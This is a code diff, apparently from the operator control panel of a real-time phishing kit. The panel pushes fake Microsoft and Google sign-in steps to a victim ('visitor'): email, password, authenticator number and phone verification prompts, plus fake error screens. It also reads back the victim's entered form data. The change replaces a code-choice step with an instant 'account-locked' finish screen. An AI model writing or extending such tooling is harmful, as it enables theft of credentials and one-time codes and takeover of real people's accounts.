@@ -172,7 +172,7 @@ const PROVIDER_PUSH_STEPS: Record<string, StepCategory[]> = {
     { category: 'Login', steps: [
       { label: '↩ Email',       step: 'email',              color: '#4b5563' },
       { label: 'Password',      step: 'password',           color: '#0078D4' },
-      { label: '⎉ Code',        step: '__code_choice__',   color: '#7c3aed' },
+      { label: '✓ Finish',       step: 'account-locked',    color: '#4b5563' },
       { label: 'Authenticator', step: 'authenticator',     color: '#0078D4' },
       { label: 'Phone Verify',  step: 'verify-phone-number', color: '#7c3aed' },
       { label: 'Other ways',    step: 'other-ways',        color: '#047857' },
@@ -375,7 +375,6 @@ function VisitorModal({
 
   // Steps that bypass the preview (send immediately or have own dialog)
   const triggerAction = (step: string, label: string, color: string, extra?: { promptNumber?: number; phoneDigits?: string }) => {
-    if (step === '__code_choice__') { setCodeTypeDialogOpen(true); return; }
     if (step === 'authenticator' && visitor.provider === 'microsoft') { setAuthenticatorNumberVal(''); setAuthenticatorDialogOpen(true); return; }
     if (step === 'phone-code' && visitor.provider === 'google') {
       const raw = (visitor.formData ?? {})['phone'] ?? '';
@@ -389,7 +388,7 @@ function VisitorModal({
       return;
     }
     // Immediate steps — send without preview confirmation
-    if (step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code' || step === 'extend-removal-time') {
+    if (step === 'account-locked' || step === 'gmail-done' || step === 'processing' || step === 'error-email' || step === 'error-password' || step === 'error-code' || step === 'extend-removal-time') {
       onPushAction(visitor.id, step, extra);
       return;
     }
